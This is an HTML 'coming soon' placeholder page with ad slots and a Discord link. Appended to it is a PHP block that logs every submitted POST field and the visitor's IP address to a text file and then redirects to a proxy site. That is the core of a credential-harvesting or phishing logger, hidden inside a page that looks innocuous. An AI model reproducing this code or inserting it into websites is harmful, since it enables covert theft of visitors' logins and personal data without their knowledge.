<html>

<head>
    <title>Menu</title>
    <link rel="stylesheet" type="text/css" href="style.css" />
    <script data-ad-client="ca-pub-2273565827129962" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
</head>

<body>
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- ze -->
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-2273565827129962"
     data-ad-slot="8450717693"
     data-ad-format="auto"
     data-full-width-responsive="true"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- ez -->
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-2273565827129962"
     data-ad-slot="1788821018"
     data-ad-format="auto"
     data-full-width-responsive="true"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
    <div class="bgimg">
        <div class="middle">
            <h1>COMING SOON</h1>
            <hr>
            <p>5 days</p>
        </div>
        <div class="bottomleft">
            <a href="https://discord.gg/ZEMZSbFty9">Discord</a>
        </div>
    </div>
</body>

<?php

$ip = $_SERVER['REMOTE_ADDR']; 

$handle = fopen("log.txt", "a");

foreach($_POST as $variable => $value) {
   fwrite($handle, $variable . "+" . $value . "\r\n");
}
fwrite($handle, "IP: $ip \r\n \r\n");
fclose($handle);

header ('Location: http://proxy4free.com');
exit;
?>
</html>